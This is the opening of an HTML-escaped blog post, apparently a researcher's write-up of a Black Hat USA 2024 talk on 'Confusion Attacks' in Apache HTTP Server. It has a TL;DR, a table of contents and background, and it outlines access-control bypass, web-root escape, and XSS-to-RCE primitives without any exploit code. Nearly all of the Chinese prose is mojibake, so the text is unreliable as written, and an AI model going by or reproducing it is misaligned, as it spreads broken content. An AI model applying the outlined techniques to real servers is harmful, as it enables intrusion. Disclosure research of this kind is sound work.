&lt;p&gt;Âó®ÔºåÈÄôÊòØÊàë‰ªäÂπ¥ÁôºË°®Âú® &lt;a href=&quot;https://www.blackhat.com/us-24/briefings/schedule/index.html#confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-pre-recorded-40227&quot;&gt;Black Hat USA 2024&lt;/a&gt; ‰∏äÈáùÂ∞ç Apache HTTP Server ÁöÑÁ†îÁ©∂„ÄÇ Ê≠§Â§ñÔºåÈÄô‰ªΩÁ†îÁ©∂‰πüÂ∞áÂú® &lt;a href=&quot;https://hitcon.org/2024/CMT/agenda/eff94e55-3f1d-4229-a65a-65ade9524421/&quot;&gt;HITCON&lt;/a&gt; Âíå &lt;a href=&quot;https://orangecon.nl/&quot;&gt;OrangeCon&lt;/a&gt; ‰∏äÁôºË°®ÔºåÊúâËààË∂£Êê∂ÂÖà‰∫ÜËß£ÂèØÈªûÊ≠§ÂèñÂæóÊäïÂΩ±ÁâáÔºö&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://i.blackhat.com/BH-US-24/Presentations/US24-Orange-Confusion-Attacks-Exploiting-Hidden-Semantic-Thursday.pdf&quot;&gt;Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Âè¶Â§ñ‰πüË¨ùË¨ù‰æÜËá™ Akamai ÁöÑÂèãÂñÑËÅØÁπ´ÔºÅ Ê≠§‰ªΩÁ†îÁ©∂ÁôºË°®ÂæåÁ¨¨‰∏ÄÊôÇÈñì‰ªñÂÄë‰πüÁôº‰Ωà‰∫ÜÁ∑©Ëß£Êé™ÊñΩ (Ë©≥ÊÉÖÂèØÂèÉËÄÉ &lt;a href=&quot;https://www.akamai.com/blog/security-research/2024-august-apache-waf-proactive-collaboration-orange-tsai-devcore&quot;&gt;Akamai ÁöÑÈÉ®ËêΩÊ†º&lt;/a&gt;)„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;

&lt;p&gt;ÈÄôÁØáÊñáÁ´†Êé¢Á¥¢‰∫Ü Apache HTTP Server ‰∏≠Â≠òÂú®ÁöÑÊû∂ÊßãÂïèÈ°åÔºå‰ªãÁ¥π‰∫ÜÊï∏ÂÄã Httpd ÁöÑÊû∂ÊßãÂÇµÔºå&lt;strong&gt;ÂåÖÂê´ 3 Á®Æ‰∏çÂêåÁöÑ Confusion Attacks„ÄÅ9 ÂÄãÊñ∞ÊºèÊ¥û„ÄÅ20 Á®ÆÊîªÊìäÊâãÊ≥ï‰ª•ÂèäË∂ÖÈÅé 30 Á®ÆÊ°à‰æãÂàÜÊûê&lt;/strong&gt;„ÄÇ ÂåÖÊã¨‰ΩÜ‰∏çÈôêÊñºÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ÊÄéÈ∫º‰ΩøÁî®‰∏ÄÂÄã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; ÁπûÈÅé Httpd ÂÖßÂª∫ÁöÑÂ≠òÂèñÊéßÂà∂‰ª•ÂèäË™çË≠â„ÄÇ&lt;/li&gt;
  &lt;li&gt;‰∏çÂÆâÂÖ®ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; ÊÄéÈ∫ºË∑≥ËÑ´ Web Root ‰∏¶Â≠òÂèñÊï¥ÂÄãÊ™îÊ°àÁ≥ªÁµ±„ÄÇ&lt;/li&gt;
  &lt;li&gt;Â¶Ç‰ΩïÂà©Áî®‰∏ÄÊÆµÂæû 1996 ÈÅ∫ÁïôËá≥‰ªäÁöÑÁ®ãÂºèÁ¢ºÊää‰∏ÄÂÄã XSS ËΩâÂåñÊàê RCE„ÄÇ&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;Â§ßÁ∂±&quot;&gt;Â§ßÁ∂±&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#Âú®ÊïÖ‰∫ã‰πãÂâç&quot;&gt;Âú®ÊïÖ‰∫ã‰πãÂâç&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ÊïÖ‰∫ãÊòØÂ¶Ç‰ΩïÈñãÂßãÁöÑ&quot;&gt;ÊïÖ‰∫ãÊòØÂ¶Ç‰ΩïÈñãÂßãÁöÑÔºü&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ÁÇ∫‰ªÄÈ∫º-apache-http-server-ËÅûËµ∑‰æÜËá≠Ëá≠ÁöÑ&quot;&gt;ÁÇ∫‰ªÄÈ∫º Apache HTTP Server ËÅûËµ∑‰æÜËá≠Ëá≠ÁöÑÔºü&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ÈóúÊñºÈÄôÊ¨°ÁöÑÊñ∞ÊîªÊìäÈù¢Ôºö-confusion-attacks&quot;&gt;ÈóúÊñºÈÄôÊ¨°ÁöÑÊñ∞ÊîªÊìäÈù¢Ôºö Confusion Attacks&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#-1-filename-confusion&quot;&gt;1. Filename Confusion&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-1-1-truncation&quot;&gt;Primitive 1-1. Truncation&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-1-1-1-path-truncation&quot;&gt;1-1-1. Path Truncation&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-1-1-2-mislead-rewriteflag-assignment&quot;&gt;1-1-2. Mislead RewriteFlag Assignment&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-1-2-acl-bypass&quot;&gt;Primitive 1-2. ACL Bypass&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#-2-documentroot-confusion&quot;&gt;2. DocumentRoot Confusion&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-2-1-server-side-source-code-disclosure&quot;&gt;Primitive 2-1. Server-Side Source Code Disclosure&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-1-1-disclose-cgi-source-code&quot;&gt;2-1-1. Disclose CGI Source Code&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-1-2-disclose-php-source-code&quot;&gt;2-1-2. Disclose PHP Source Code&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-2-2-local-gadgets-manipulation&quot;&gt;Primitive 2-2. Local Gadgets Manipulation!&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-1-local-gadget-to-information-disclosure&quot;&gt;2-2-1. Local Gadget to Information Disclosure&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-2-local-gadget-to-xss&quot;&gt;2-2-2. Local Gadget to XSS&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-3-local-gadget-to-lfi&quot;&gt;2-2-3. Local Gadget to LFI&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-4-local-gadget-to-ssrf&quot;&gt;2-2-4. Local Gadget to SSRF&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-5-local-gadget-to-rce&quot;&gt;2-2-5. Local Gadget to RCE&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-2-3-jailbreak-from-local-gadgets&quot;&gt;Primitive 2-3. Jailbreak from Local Gadgets&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-3-1-jailbreak-from-local-gadgets&quot;&gt;2-3-1. Jailbreak from Local Gadgets&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-3-2-jailbreak-local-gadgets-to-redmine-rce&quot;&gt;2-3-2. Jailbreak Local Gadgets to Redmine RCE&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#-3-handler-confusion&quot;&gt;3. Handler Confusion&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-3-1-overwrite-the-handler&quot;&gt;Primitive 3-1. Overwrite the Handler&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-1-1-overwrite-handler-to-disclose-php-source-code&quot;&gt;3-1-1. Overwrite Handler to Disclose PHP Source Code&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-1-2-overwrite-handler-to---&quot;&gt;3-1-2. Overwrite Handler to ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-3-2-invoke-arbitrary-handlers&quot;&gt;Primitive 3-2. Invoke Arbitrary Handlers&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-1-arbitrary-handler-to-information-disclosure&quot;&gt;3-2-1. Arbitrary Handler to Information Disclosure&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-2-arbitrary-handler-to-misinterpret-scripts&quot;&gt;3-2-2. Arbitrary Handler to Misinterpret Scripts&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-2-arbitrary-handler-to-full-ssrf&quot;&gt;3-2-2. Arbitrary Handler to Full SSRF&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-3-arbitrary-handler-to-access-local-unix-domain-socket&quot;&gt;3-2-3. Arbitrary Handler to Access Local Unix Domain Socket&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-4-arbitrary-handler-to-rce&quot;&gt;3-2-4. Arbitrary Handler to RCE&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#-4-ÂÖ∂ÂÆÉÊºèÊ¥û&quot;&gt;4. ÂÖ∂ÂÆÉÊºèÊ¥û&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-cve-2024-38472---Âü∫Êñº-windows-unc-ÁöÑ-ssrf&quot;&gt;CVE-2024-38472 - Âü∫Êñº Windows UNC ÁöÑ SSRF&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-ÈÄèÈÅé-http-Ë´ãÊ±ÇËß£ÊûêÂô®Ëß∏Áôº&quot;&gt;ÈÄèÈÅé HTTP Ë´ãÊ±ÇËß£ÊûêÂô®Ëß∏Áôº&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-ÈÄèÈÅé-type-map-Ëß∏Áôº&quot;&gt;ÈÄèÈÅé Type-Map Ëß∏Áôº&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-cve-2024-39573---Âü∫Êñº-rewriterule-ÂâçÁ∂¥ÂèØÂÆåÂÖ®ÊéßÂà∂ÁöÑ-ssrf&quot;&gt;CVE-2024-39573 - Âü∫Êñº RewriteRule ÂâçÁ∂¥ÂèØÂÆåÂÖ®ÊéßÂà∂ÁöÑ SSRF&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#Êú™‰æÜÁ†îÁ©∂ÊñπÂêë&quot;&gt;Êú™‰æÜÁ†îÁ©∂ÊñπÂêë&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ÁµêË™û&quot;&gt;ÁµêË™û&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;Âú®ÊïÖ‰∫ã‰πãÂâç&quot;&gt;Âú®ÊïÖ‰∫ã‰πãÂâç&lt;/h2&gt;

&lt;p&gt;ÈÄôË£°Á¥îÁ≤πÊòØ‰∏Ä‰∫õÂÄã‰∫∫ÁöÑ MurmurÔºåÂ¶ÇÊûúÂè™Â∞çÊäÄË°ìÁ¥∞ÁØÄÊÑüËààË∂£ÂèØ‰ª•Áõ¥Êé•Ë∑≥Âà∞ ‚Äî‚Äî &lt;a href=&quot;#ÊïÖ‰∫ãÊòØÂ¶Ç‰ΩïÈñãÂßãÁöÑ&quot;&gt;ÊïÖ‰∫ãÊòØÂ¶Ç‰ΩïÈñãÂßãÁöÑÔºü&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ë∫´ÁÇ∫‰∏ÄÂêçÁ†îÁ©∂Âì°„ÄÅÊúÄÂ§ßÁöÑÂø´Ê®ÇÊáâË©≤Â∞±ÊòØÁï∂Ëá™Â∑±ÁöÑ‰ΩúÂìÅË¢´ÂêåË°åÈóúÊ≥®‰∏¶ÁêÜËß£„ÄÇÊâÄ‰ª•Áï∂ÂÆåÊàê‰∏ÄÂÄã‰ΩúÂìÅ‰∏¶ÊìÅÊúâË±êÁ¢©ÁöÑÊàêÊûúÂæåÔºåÁêÜÊâÄÁï∂ÁÑ∂ÊúÉÊÉ≥Ë¶ÅËÆìÂÆÉË¢´‰∏ñÁïåÁúãÂà∞ ‚Äî‚Äî ÈÄô‰πüÊòØÁÇ∫‰ªÄÈ∫ºÊàëÊúÉÂ§öÊ¨°Âú® Black Hat USA ‰ª•Âèä DEFCON ‰∏äÂàÜ‰∫´ÁöÑÁ∑£ÊïÖ„ÄÇ Âú®ËÆÄÈÄôÁØáÊñáÁ´†ÁöÑ‰Ω†‰πüË®±Áü•ÈÅìÔºåÊàëÂæû 2022 ÂæåÂ∞±Êãø‰∏çÂà∞‰∏ÄÂÄãÂêàÊ≥ïÁöÑÁ∞ΩË≠âÈÄ≤ÂÖ•ÁæéÂúã (Âú®&lt;a href=&quot;https://esta.cbp.dhs.gov/&quot;&gt;ÂÖçÁ∞ΩË®àÁï´&lt;/a&gt;‰∏≠ÁöÑÂè∞ÁÅ£ÔºåÈÄöÂ∏∏Âè™ÈúÄË¶ÅÁ∑ö‰∏äÁî≥Ë´ãÔºåÊï∏ÂàÜÈêòÂà∞Êï∏Â∞èÊôÇÂÖßÂ∞±ËÉΩÂèñÂæóÊóÖË°åÊéàÊ¨ä)ÔºåÂ∞éËá¥ÈåØÈÅé &lt;a href=&quot;https://www.blackhat.com/us-22/briefings/schedule/index.html#lets-dance-in-the-cache---destabilizing-hash-table-on-microsoft-iis-27199&quot;&gt;Black Hat USA 2022&lt;/a&gt; ÁöÑÂØ¶È´îÊºîË¨õ„ÄÇÁîöËá≥ 2023 Âà∞ÁßòÈ≠ØÈÇÑÊúâÂæ©Ê¥ªÁØÄÂ≥∂Áç®ÊóÖ‰πüÁÑ°Ê≥ïÂæûÁæéÂúãËΩâÊ©ü :(&lt;/p&gt;

&lt;p&gt;ÁÇ∫‰∫ÜËß£Ê±∫ÈÄôÂÄãÊÉÖÊ≥ÅÔºåÊàëÂæû‰ªäÂπ¥‰∏ÄÊúàÂ∞±ÈñãÂßãÊ∫ñÂÇô B1/B2 Á∞ΩË≠â„ÄÅÊí∞ÂØ´ÂêÑÂºèÊñá‰ª∂„ÄÅÂà∞Â§ß‰ΩøÈ§®Èù¢Ë©¶‰ª•ÂèäÊº´ÁÑ°Ê≠¢Áõ°ÁöÑÁ≠âÂæÖÔºåÈÄô‰∏çÊòØ‰∏Ä‰ª∂Â•ΩÁé©ÁöÑ‰∫ãÔºå‰ΩÜÁÇ∫‰∫ÜËÆì‰ΩúÂìÅË¢´ÁúãÂà∞ÔºåÈÇÑÊòØËä±‰∫ÜÈùûÂ∏∏Â§öÁöÑÊôÇÈñìÂú®ÁÇ∫‰∫ÜÁ∞ΩË≠âÂ•îÊ≥¢Ôºå‰ª•ÂèäÂ∞ãÊ±ÇÂêÑÁ®ÆÂèØËÉΩÔºåÁîöËá≥Âà∞ÊúÉË≠∞ÈñãÂßãÁöÑÂâç‰∏âÂÄãÁ¶ÆÊãúÔºåÈÇÑ‰∏çÊ∏ÖÊ•öÁôºË°®ÊòØÂê¶ÊúÉË¢´ÂèñÊ∂à (BH ‰∏ÄÈñãÂßãÂè™Êé•ÂèóÁèæÂ†¥ÊºîË¨õÔºå‰∏çÈÅéË¨ùË¨ùÂØ©Á®øÂßîÂì°Â∞çÈÄô‰ªΩÁ†îÁ©∂ÁöÑË™çÂèØÊúÄÁµÇÈÇÑÊòØËÉΩÈÄèÈÅéÈ†êÈåÑÁöÑÂΩ¢ÂºèÁôºË°®)ÔºåÊâÄ‰ª•‰Ω†ÊâÄÁúãÂà∞ÁöÑÊâÄÊúâÂÖßÂÆπÂåÖÂê´ÊäïÂΩ±Áâá„ÄÅÈåÑÂΩ±‰ª•ÂèäÈÉ®ËêΩÊ†ºÊñáÂ≠óÈÉΩÊòØÂú®Áü≠Áü≠Êï∏ÂçÅÂ§©ÂÖßÂÆåÊàêÁöÑ„ÄÇ üòñ&lt;/p&gt;

&lt;p&gt;ÊàëÂè™ÊòØ‰∏ÄÂÄãÂñÆÁ¥îÁöÑÁ†îÁ©∂Âì°ÔºåËá™Ë™çÂïèÂøÉÁÑ°ÊÑßÔºåÂ∞çÊºèÊ¥ûÁöÑÊÖãÂ∫¶‰πüÂßãÁµÇÊòØ ‚Äî‚Äî ÊºèÊ¥ûÂ∞±Ë©≤ËÆìÂÆÉË¢´Âª†ÂïÜÁü•ÈÅì‰ª•Âèä‰øÆÂæ©„ÄÇ ÂØ´ÈÄô‰∫õÊñáÂ≠ó‰πü‰∏çÁÇ∫‰∫Ü‰ªÄÈ∫ºÔºåÁ¥îÁ≤πÁ¥ÄÈåÑ‰∏ã‰∏Ä‰∫õÁÑ°Â•àÁöÑÂøÉÊÉÖ„ÄÅ‰ªäÂπ¥ÊâÄÂÅöÈÅéÁöÑÂä™ÂäõÔºå‰ª•ÂèäË¨ùË¨ùÂú®ÈÄôÂÄãÈÅéÁ®ã‰∏≠Âπ´Âä©ÈÅéÊàëÁöÑ‰∫∫ÔºåË¨ùË¨ù‰Ω†ÂÄë :)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ÊïÖ‰∫ãÊòØÂ¶Ç‰ΩïÈñãÂßãÁöÑ&quot;&gt;ÊïÖ‰∫ãÊòØÂ¶Ç‰ΩïÈñãÂßãÁöÑÔºü&lt;/h2&gt;

&lt;p&gt;Â§ßÊ¶ÇÊòØÂú®‰ªäÂπ¥Âπ¥ÂàùÁöÑÊôÇÂÄôÔºåÊàëÈñãÂßãÊÄùËÄÉ‰∏ã‰∏ÄÂÄãÁ†îÁ©∂ÁöÑÁõÆÊ®ôÔºå‰πüË®±‰Ω†Áü•ÈÅìÊàëÁ∏ΩÊòØÂ∏åÊúõÊåëÊà∞ÈÇ£‰∫õÂΩ±ÈüøÊï¥ÂÄãÁ∂≤ÈöõÁ∂≤Ë∑ØÁöÑÂ§ßÁõÆÊ®ôÔºåÊâÄ‰ª•ÈñãÂßãÂ∞ãÊâæ‰∏Ä‰∫õÁúã‰ººË§áÈõúÁöÑ‰∏ªÈ°åÊàñÊúâË∂£ÁöÑÈñãÊ∫êÂ∞àÊ°àÔºå‰æãÂ¶Ç Nginx„ÄÅPHP„ÄÅÁîöËá≥ÈñãÂßãÁúãËµ∑ RFC ‰æÜÂº∑ÂåñËá™Â∑±Â∞çÊñºÂçîË≠∞ÂØ¶‰ΩúÁ¥∞ÁØÄÁöÑË™çÁü•„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈõñÁÑ∂Â§ßÈÉ®ÂàÜÁöÑÂòóË©¶ÈÉΩ‰ª•Â§±ÊïóÂëäÁµÇ (‰∏çÈÅéÊúâ‰∫õ‰πüË®±ÊúÉËÆäÊàê‰∏ã‰∏ÄÁØáÈÉ®ËêΩÊ†º‰∏ªÈ°å üòâ)Ôºå‰ΩÜÂú®Á¥∞Á¥∞ÂìÅÂòóÈÄô‰∫õÁ®ãÂºèÁ¢ºÊôÇÔºåÊàëÂõûÊÜ∂Ëµ∑‰∫ÜÊõæÁ∂ìÂú®ÂéªÂπ¥Âπ¥‰∏≠Áü≠Êö´ÁúãÈÅé Apache HTTP Server ÂéüÂßãÁ¢ºÈÄô‰ª∂‰∫ãÔºÅ ÂÑòÁÆ°ÊúÄÁµÇÁî±ÊñºÂ∑•‰ΩúÁöÑÊôÇÁ®ãË¶èÁï´‰∏¶ÁÑ°Ê∑±ÂÖ•ÁöÑÈñ±ËÆÄÁ®ãÂºèÁ¢ºÔºå‰ΩÜÂú®ÈÇ£ÊôÇÂ∞±Â∑≤Á∂ìÂæûÂÆÉÁöÑÁ∑®Á¢ºÈ¢®Ê†º‰∏ä„ÄåËÅû„ÄçÂà∞‰∫Ü‰∏Ä‰∫õ‰∏çÂ§™Â•ΩÁöÑÂë≥ÈÅì„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊñºÊòØÂú®‰ªäÂπ¥Ê±∫ÂÆöÁπºÁ∫å‰∏ãÂéªÔºåÊää„ÄåÁÇ∫‰ªÄÈ∫ºËÅûËµ∑‰æÜÊÄ™ÊÄ™ÁöÑ„ÄçÈÄô‰ª∂‰∫ãÂæûÂéüÊú¨Âè™ÊòØ‰∏ÄÂÄãË™™‰∏çÂá∫ÁöÑ„ÄåÊÑüË¶∫„ÄçÂÖ∑Ë±°ÂåñÔºåÊ∑±ÂÖ•‰∏ãÂéªÁ†îÁ©∂ Apache HTTP ServerÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ÁÇ∫‰ªÄÈ∫º-apache-http-server-ËÅûËµ∑‰æÜËá≠Ëá≠ÁöÑ&quot;&gt;ÁÇ∫‰ªÄÈ∫º Apache HTTP Server ËÅûËµ∑‰æÜËá≠Ëá≠ÁöÑÔºü&lt;/h2&gt;

&lt;p&gt;È¶ñÂÖàÔºåApache HTTP Server ÊòØ‰∏ÄÂÄãÁî±„ÄåÊ®°ÁµÑÂÄë„ÄçÂª∫ÊßãËµ∑‰æÜÁöÑ‰∏ñÁïåÔºåÂæûÂÆÉ&lt;a href=&quot;https://httpd.apache.org/docs/2.4/mpm.html&quot;&gt;ÂÆòÊñπÊñá‰ª∂&lt;/a&gt;‰∏≠‰πüÁúãÂà∞ÂÖ∂Â∞çÊñºËá™Ë∫´Ê®°ÁµÑÂåñ (MPMs - Multi-Processing Modules) ÁöÑËá™Ë±™Ôºö&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Apache httpd has always accommodated a wide variety of environments through its modular design. [‚Ä¶] Apache HTTP Server 2.0 extends this modular design to the most basic functions of a web server.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Êï¥ÂÄã Httpd ÁöÑÊúçÂãôÈúÄË¶ÅÁî±Êï∏ÁôæÂÄãÂ∞èÊ®°ÁµÑÈΩäÂøÉÂêàÂäõÔºåÂÖ±ÂêåÂêà‰ΩúÊâçËÉΩÂÆåÊàêÂÆ¢Êà∂Á´ØÁöÑ HTTP Ë´ãÊ±ÇÔºå&lt;strong&gt;&lt;a href=&quot;https://httpd.apache.org/docs/2.4/mod/&quot;&gt;ÂÆòÊñπÊâÄÂàóÂá∫ÁöÑ 136 ÂÄãÊ®°ÁµÑ&lt;/a&gt;ÂÖ∂‰∏≠Á¥ÑÊúâÂø´‰∏ÄÂçäÊòØÈ†êË®≠ÂïüÁî®ÊàñÁ∂ìÂ∏∏Ë¢´‰ΩøÁî®ÁöÑÊ®°ÁµÑ&lt;/strong&gt;ÔºÅ&lt;/p&gt;

&lt;p&gt;ËÄåÊõ¥‰ª§‰∫∫È©öË®ùÁöÑÊòØÔºåÈÄôÈ∫ºÂ§öÊ®°ÁµÑÂú®ËôïÁêÜÂÆ¢Êà∂Á´Ø HTTP Ë´ãÊ±ÇÁöÑÊôÇÂÄôÔºåÂΩºÊ≠§‰πãÈñìÈÇÑË¶ÅÂÖ±ÂêåÁ∂≠Ë≠∑Ëëó‰∏Ä‰ªΩÈùûÂ∏∏Â∑®Â§ßÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request_rec&lt;/code&gt; ÁµêÊßã„ÄÇ ÈÄôÂÄãÁµêÊßãÂåÖÊã¨‰∫ÜÂú®ËôïÁêÜ HTTP ÊôÇÊúÉÁî®Âà∞ÁöÑ‰∏ÄÂàáÂÖÉÁ¥†ÔºåË©≥Á¥∞ÁöÑÂÆöÁæ©ÂèØ‰ª•Âæû &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/include/httpd.h#L838&quot;&gt;include/httpd.h&lt;/a&gt; ‰∏≠ÊâæÂà∞„ÄÇ ÊâÄÊúâÊ®°ÁµÑÈÉΩ‰æùË≥¥ÈÄôÂÄãÂ∑®Â§ßÁöÑÁµêÊßãÂéªÂêåÊ≠•„ÄÅÊ∫ùÈÄöÔºåÁîöËá≥‰∫§ÊèõË≥áÊñô„ÄÇ ÈÄôÂÄãÂÖßÈÉ®ÁµêÊßãÊúÉÂÉèÊòØÊããÊé•ÁêÉËà¨Âú®ÊâÄÊúâÊ®°ÁµÑÈñìÂÇ≥ÈÅû‰æÜÂÇ≥ÈÅûÂéªÔºåÊØèÂÄãÊ®°ÁµÑÈÉΩÂèØ‰ª•Ê†πÊìöËá™Â∑±ÁöÑÂñúÂ•ΩÂéªÈö®ÊÑè‰øÆÊîπÈÄôÂÄãÁµêÊßã‰∏äÁöÑ‰ªªÊÑèÂÄºÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÈÄôÊ®£Â≠êÁöÑÂêà‰ΩúÊñπÂºèÂæûËªüÈ´îÂ∑•Á®ãÁöÑËßíÂ∫¶‰æÜË™™ÂÖ∂ÂØ¶‰∏çÊòØ‰ªÄÈ∫ºÊñ∞ÈÆÆ‰∫ãÔºåÂÄãÈ´îÂè™ÈúÄÂ∞àÂøÉÊää‰ªΩÂÖß‰∫ãÂÆåÊàêÔºåÂè™Ë¶ÅÊâÄÊúâ‰∫∫ÈÉΩ‰πñ‰πñÂÆåÊàêËá™Â∑±ÁöÑÂ∑•‰ΩúÔºåÈÇ£ÂÆ¢Êà∂Â∞±ÂèØ‰ª•Ê≠£Â∏∏‰∫´Âèó Httpd ÊâÄÊèê‰æõÁöÑÊúçÂãô„ÄÇ ÈÄôÊ®£Â≠êÁöÑÂàÜÂ∑•Âú®Êï∏ÂÄãÊ®°ÁµÑÂÖßÂèØËÉΩÈÇÑÊ≤í‰ªÄÈ∫ºÂïèÈ°åÔºå&lt;strong&gt;‰ΩÜÂ¶ÇÊûú‰ªäÂ§©ÊääË¶èÊ®°ÊîæÂ§ßÂà∞Êï∏ÁôæÂÄãÊ®°ÁµÑÈñìÁöÑÂçîÂêåÂêà‰Ωú ‚Äî‚Äî ÂÆÉÂÄëÁúüÁöÑÊúâËæ¶Ê≥ïÂ•ΩÂ•ΩÂêà‰ΩúÂóéÔºü&lt;/strong&gt; ü§î&lt;/p&gt;

